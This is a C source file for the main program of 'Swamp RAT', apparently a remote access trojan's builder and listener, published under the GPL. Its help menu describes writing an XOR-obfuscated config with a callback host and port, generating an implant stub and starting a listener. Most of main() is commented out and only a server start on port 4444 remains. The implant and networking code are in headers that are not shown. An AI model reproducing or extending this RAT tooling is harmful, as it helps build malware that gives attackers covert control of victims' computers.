/*-----------------------------------------------------------------------\
| Copyright (C) 2018  Lilly Chalupowski                                  |
|                                                                        |
| This program is free software: you can redistribute it and/or modify   |
| it under the terms of the GNU General Public License as published by   |
| the Free Software Foundation, either version 3 of the License, or      |
| (at your option) any later version.                                    |
|                                                                        |
| This program is distributed in the hope that it will be useful,        |
| but WITHOUT ANY WARRANTY; without even the implied warranty of         |
| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          |
| GNU General Public License for more details.                           |
|                                                                        |
| You should have received a copy of the GNU General Public License      |
| along with this program.  If not, see <https://www.gnu.org/licenses/>. |
\-----------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include "include/main/net.h"
#include "include/main/config.h"

void help_menu(){
  printf("Swamp RAT by lillypad\n"
         "  [-h][--help  ]   help menu\n"
         "  [-c][--config]   write config file\n"
         "    [-x][--xor ]   xor key (int)"
         "    [-H][--host]   server host\n"
         "    [-p][--port]   server port\n"
         "  [-s][--stub]     write stub file\n"
         "    [-i][--input]  input config file"
         "  [-l][--listen]   listener\n"
         "    [-p][--port]   listener port\n"
         "swamp-rat -x 10 -H 127.0.0.1 -p 80 -c config.bin\n"
         "swamp-rat -s stub -i config.bin\n");
}

int main(int argc, char **argv){
  /* char *host = "127.0.0.1"; */
  /* int host_port = 80; */
  /* char *config_path = "config.bin"; */
  /* int xor_key = 10; */
  /* if (argc == 2){ */
  /*   if (strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0){ */
  /*     help_menu(); */
  /*     return EXIT_SUCCESS; */
  /*   } */
  /* } */
  /* for (int i = 1; i < argc; i++){ */
  /*   if (strcmp(argv[i], "-c") == 0 || strcmp(argv[i], "--config")){ */
  /*     config_path = argv[i+1]; */
  /*     config_write(config_path, host, host_port, xor_key); */
  /*     return EXIT_SUCCESS; */
  /*   } */
  /* } */
  /* for (int i = 1; i < argc; i++){ */
  /*   if (strcmp(argv[i], "-s") == 0 || strcmp(argv[i], "--stub") == 0){ */
  /*     return EXIT_SUCCESS; */
  /*   } */
  /* } */
  /* fprintf(stderr, "error: not enough arguments\n"); */
  //help_menu();
  net_start_server(4444);
  return EXIT_FAILURE;
}
